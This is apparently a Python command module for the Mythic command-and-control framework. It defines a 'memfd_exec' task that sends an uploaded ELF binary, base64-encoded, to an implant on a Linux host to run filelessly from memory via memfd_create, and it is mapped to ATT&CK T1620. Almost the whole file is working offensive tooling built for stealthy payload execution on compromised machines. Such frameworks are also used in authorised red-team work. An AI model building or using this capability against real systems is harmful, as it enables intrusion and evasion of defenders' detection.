from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class MemfdExecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="ELF binary to execute from memory (never touches disk)",
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                default_value="",
                description="Arguments to pass to the executed binary",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class MemfdExecCommand(CommandBase):
    cmd = "memfd_exec"
    needs_admin = False
    help_cmd = "memfd_exec -file <elf_binary> [-arguments 'arg1 arg2']"
    description = "Execute an ELF binary entirely from memory using memfd_create. The binary never touches disk."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1620"]
    argument_class = MemfdExecArguments
    attributes = CommandAttributes(builtin=False, supported_os=[SupportedOS.Linux])

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        file_id = taskData.args.get_arg("file")
        args = taskData.args.get_arg("arguments")

        file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id
        ))
        if not file_resp.Success:
            raise Exception(f"Failed to get file: {file_resp.Error}")

        import base64
        taskData.args.add_arg("elf_data", base64.b64encode(file_resp.Content).decode())
        response.DisplayParams = f"({len(file_resp.Content)} bytes) {args}" if args else f"({len(file_resp.Content)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
